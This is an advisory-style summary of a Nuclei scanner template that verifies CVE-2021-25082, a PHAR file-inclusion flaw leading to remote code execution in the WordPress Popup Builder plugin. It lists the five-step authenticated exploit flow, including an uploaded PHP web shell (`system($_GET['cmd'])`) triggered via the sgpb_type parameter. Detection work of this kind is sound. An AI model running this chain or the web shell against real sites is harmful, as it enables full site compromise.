---
cve_id: CVE-2021-25082
template_path: nuclei-templates/http/cves/2021/CVE-2021-25082.yaml
affected_product: WordPress Popup Builder plugin
severity: critical
authentication: required
external_callback: false
affected_versions: < 4.0.7
preconditions: [authenticated WordPress user with file upload permissions]
poc_classification: rce
---

## Vulnerability
WordPress Popup Builder plugin before 4.0.7 contains a local file inclusion caused by unsanitized 'sgpb_type' parameter in require statement, letting attackers include arbitrary local files or execute code via wrappers like PHAR. Exploit requires attacker to control 'sgpb_type' parameter.  
Impact: Attackers can include arbitrary local files or execute code remotely, leading to remote code execution and full site compromise.  
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (score 8.8). CWE-98.  
Remediation: Update to version 4.0.7 or later.

## PoC / Detection
Classification: rce  
The template performs a 5-step authenticated flow (http(1) && http(2) && http(3) && http(4) && http(5)) to verify RCE:  
- POST /wp-login.php with provided username/password; matches 302 + wordpress_logged_in cookie.  
- GET /wp-admin/upload.php; extracts _wpnonce via regex and matches 200 + nonce in body.  
- POST /wp-admin/async-upload.php (multipart) uploading malicious.zip (base64 ZIP containing Popup.php with `<?php system($_GET["cmd"]); ?>`); extracts upload year/month.  
- GET /wp-content/uploads/{{year}}/{{month}}/malicious.zip; confirms 200 + application/zip.  
- GET /?sgpb_type=phar://wp-content/uploads/{{year}}/{{month}}/malicious.zip/&cmd=echo {{marker}}; matches 200 + marker in body.

## References
- https://wpscan.com/vulnerability/0f90f10c-4b0a-46da-ac1f-aa6a03312132/
- https://nvd.nist.gov/vuln/detail/CVE-2021-25082
